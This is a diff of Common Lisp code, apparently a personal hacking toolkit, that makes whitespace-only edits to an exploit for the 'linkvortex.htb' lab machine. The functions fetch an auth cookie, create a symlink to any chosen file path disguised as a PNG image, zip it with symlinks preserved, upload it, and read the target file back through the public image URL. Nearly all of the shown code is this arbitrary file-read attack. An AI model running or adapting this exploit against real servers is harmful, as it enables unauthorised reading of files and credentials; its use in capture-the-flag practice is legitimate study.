@@ -1,4 +1,4 @@
-(in-package :grimoire) 
+(in-package :grimoire)
 
 (defun linkvortex/cookie-jar (username password)
   "get the cookie for auth"
@@ -14,13 +14,13 @@
 (defun linkvortex/create-exploit (path)
   "create a symlink to the path and zip it"
   (ensure-directories-exist (project-path "exploit/content/images/2025/"))
-  
+
   (let* ((uid (random-string 16))
          (image-path (project-path (format nil "exploit/content/images/2025/~a.png" uid))))
     (uiop:run-program (format nil "ln -s ~a ~a" path image-path))
-    (uiop:run-program (format nil "cd ~a && zip -r -y ~a.zip ~a" 
+    (uiop:run-program (format nil "cd ~a && zip -r -y ~a.zip ~a"
                               *project-dir* uid "exploit/"))
-    
+
     uid))
 
 (defun linkvortex/send-exploit (uid cookie-jar)
@@ -33,7 +33,7 @@
   "read the image"
   (trivial-utf-8:utf-8-bytes-to-string
    (dex:get (format nil "http://linkvortex.htb/content/images/2025/~a.png" uid))))
- 
+
 (defun linkvortex/read (path)
   "read function for linkvortex"
   (let ((uid (linkvortex/create-exploit path))
